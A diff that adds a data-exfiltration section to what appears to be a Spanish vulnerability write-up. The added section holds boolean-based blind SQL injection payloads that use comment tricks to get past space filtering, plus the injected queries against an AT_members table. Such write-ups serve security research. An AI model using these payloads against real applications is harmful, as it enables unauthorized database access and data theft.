@@ -60,3 +60,22 @@ Después de pasar un tiempo haciéndolo, descubrimos un hallazgo potencialmente 
 - `àddslashes`: Devuelve una cadena con barras invertidas añadidas antes de los caracteres que deben escaparse (',",\,NUL)  
 - `continue`:se utiliza dentro de las estructuras iterativas para saltar el resto de la iteración actual del bucle y continuar la ejecución en la evaluación de la condición, para luego comenzar la siguiente iteración.
 
+-----
+## Exfiltracion de datos
+```
+> select/**/1;
+> AAAA')/**/or/**/(select/**/1)=1%23 
+> AAAA')/**/or/**/(select/**/1)=0%23
+>  SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=1#%' OR second_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=1#%' OR last_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=1#%' OR login LIKE 
+'%AAAA')/**/or/**/(select/**/1)=1#%');\n;
+>  SELECT count(*) FROM AT_members M WHERE (first_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=0#%' OR second_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=0#%' OR last_name LIKE 
+'%AAAA')/**/or/**/(select/**/1)=0#%' OR login LIKE 
+'%AAAA')/**/or/**/(select/**/1)=0#%');\n;
+```
+
+
